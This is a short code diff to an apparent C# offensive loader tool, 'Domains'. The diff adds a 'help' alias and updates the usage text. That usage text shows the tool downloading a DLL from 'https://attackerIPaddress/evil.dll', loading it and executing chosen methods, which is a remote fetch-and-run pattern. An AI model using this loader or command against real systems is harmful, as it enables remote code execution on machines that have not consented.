@@ -13,6 +13,9 @@ namespace Domains
                 getValues(args, out var url, out var method, out var assembly);
 
 
+                if (args[0] == "-h")
+                    args[0] = "help";
+
                 switch (args[0])
                 {
                     case "load":
@@ -50,7 +53,7 @@ namespace Domains
                         break;
                     case "exit":
                         return true;
-                    case "-h":
+                    case "help":
                         printHelp();
                         break;
                     default:
@@ -96,12 +99,14 @@ namespace Domains
 usage:  Domains.exe load -u https://attackerIPaddress/evil.dll 
         Domains.exe execute -a assemblyName -m method
         Domains.exe unload -a assemblyName
-        Domains.exe list  
+        Domains.exe list
+        Domains.exe help
 
   options:
     -u  URL where the assembly should be downloaded from.
     -a  Select assembly by name.
-    -m  Method to execute.  
+    -m  Method to execute.
+    -h  Show help menu.
 ";
             Console.WriteLine(help);
         }
